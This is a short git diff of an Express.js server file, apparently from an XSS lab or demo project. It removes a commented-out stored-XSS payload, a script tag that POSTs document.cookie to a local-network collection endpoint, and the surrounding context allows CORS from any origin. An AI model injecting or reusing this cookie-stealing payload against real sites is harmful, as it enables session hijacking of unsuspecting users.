@@ -11,8 +11,6 @@ var express = require ('express'),
   app = express (),
   counter = 1;
 
-  //<script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://192.168.0.103:8085/stored'});</script>
-
 //------------------CORS-----------------------------------------------------------/
   app.use(function(req, res, next) {
     res.header("Access-Control-Allow-Origin", "*");
